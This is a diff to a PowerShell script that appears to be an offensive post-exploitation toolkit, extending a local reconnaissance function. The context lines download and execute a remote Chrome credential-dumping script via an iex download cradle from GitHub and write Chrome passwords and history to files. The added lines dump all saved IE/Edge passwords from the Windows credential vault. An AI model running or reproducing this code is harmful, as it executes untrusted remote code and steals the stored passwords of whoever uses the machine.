@@ -433,10 +433,18 @@ function localreconmodules
             {
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-ChromeDump.ps1')
                 Install-SqlLiteAssembly
-                Get-ChromeDump >> "$currentPath\LocalRecon\Chromecredentials.txt"
+                Get-ChromeDump >> "$currentPath\LocalRecon\Chrome_Credentials.txt"
                 Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
                 Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
-            }                
+            }
+	    
+            $IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'
+            if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
+            {
+	    	[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+	    	$vault = New-Object Windows.Security.Credentials.PasswordVault 
+	    	$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\LocalRecon\InternetExplorer_Credentials.txt"
+	    }
 }
 
 function passhunt
